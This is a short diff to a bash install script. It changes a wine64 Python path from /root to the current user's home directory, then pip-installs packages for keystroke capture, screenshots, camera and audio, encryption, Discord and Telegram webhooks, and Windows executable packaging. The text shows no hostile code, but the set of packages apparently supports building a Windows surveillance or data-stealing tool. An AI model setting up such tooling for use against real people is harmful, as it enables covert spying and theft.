@@ -61,9 +61,10 @@ if [[ "$OSTYPE" == "linux-gnu"* ]]; then
     fi
 
     # Install necessary Python packages using wine64
-    PYTHON_EXE="/root/.wine64/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38/python.exe"
+    USERNAME=$(whoami)
+    PYTHON_EXE="$HOME/.wine64/drive_c/users/$USERNAME/Local Settings/Application Data/Programs/Python/Python38/python.exe"
     if [[ ! -f "$PYTHON_EXE" ]]; then
-        PYTHON_EXE="/root/.wine64/drive_c/users/root/AppData/Local/Programs/Python/Python38/python.exe"
+        PYTHON_EXE="$HOME/.wine64/drive_c/users/$USERNAME/AppData/Local/Programs/Python/Python38/python.exe"
     fi
 
     sudo wine "$PYTHON_EXE" -m pip install pillow==8.3.2 pyscreeze==0.1.28 pyautogui==0.9.52 psutil keyboard==0.13.5 pywin32==303 pycryptodome==3.12.0 pyinstaller==5.3 discord_webhook==0.14.0 discord.py opencv-python==4.5.3.56 sounddevice scipy==1.9.0 pyTelegramBotAPI PyGithub
